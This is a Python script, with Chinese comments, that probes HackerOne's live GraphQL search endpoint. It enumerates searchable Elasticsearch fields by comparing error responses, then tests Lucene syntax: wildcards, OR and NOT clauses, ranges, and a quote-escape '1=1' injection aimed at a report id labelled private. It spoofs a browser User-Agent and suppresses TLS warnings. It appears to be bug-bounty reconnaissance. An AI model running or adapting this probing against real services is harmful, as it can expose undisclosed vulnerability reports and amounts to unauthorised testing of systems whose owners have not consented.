# -*- coding: utf-8 -*-
"""h1x49e: ES search query_string 字段白名单枚举 + Lucene 语法面(匿名只读)
原理:字段名:值 语法中字段名被后端校验,报错差异 = "not searchable"(存在但禁搜)
vs 语法错误(字段不存在/未映射) vs 正常返回(可搜索)"""
import sys, io, json
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def search(name, qs, index='CompleteHacktivityReportIndex', timeout=20):
    q = '{ search(index: %s, query_string: "%s", limit: 1) { total_count } }' % (index, qs.replace('"', '\\"'))
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=timeout)
        t = r.text[:200]
        print(f'--- {name} ---')
        print(f'  [{r.status_code}] {t}')
        return r.text
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e} ---')
        return None

# ========== 1. 字段名枚举(值用空串或通配,先看字段名校验差异) ==========
fields = [
    'title', 'description', 'weakness', 'cwe', 'state', 'substate', 'team',
    'team_handle', 'reporter', 'reporter.username', 'reporter_username',
    'severity', 'severity_rating', 'asset', 'asset_identifier', 'program',
    'database_id', 'id', 'created_at', 'submitted_at', 'public', 'disclosed_at',
    'url', 'hacktivity', 'tag', 'tags', 'activity', 'status', 'content',
    'vulnerability_information', 'reference', 'references', 'bounty',
]
for f in fields:
    search(f, f + ':*')

# ========== 2. Lucene 语法面 ==========
print()
print('===== Lucene 语法面 =====')
search('plain_text_pub_id', '2487889')          # 公开报告 id 纯文本
search('plain_text_priv_id', '3732660')         # 私有报告 id 纯文本
search('or_clause', '3732660 OR 2487889')
search('wild_all', '*')
search('wild_title', 'title:*')
search('exists_title', '_exists_:title')
search('neg_pub', 'NOT 2487889')
search('range_dates', 'submitted_at:[2020-01-01 TO 2026-12-31]')
search('fuzzy', 'phishing~')
search('paren_or', '(phishing OR sql)')
search('quote_escape', '"3732660 OR 1=1"')
search('field_dot', 'reporter.username:*')
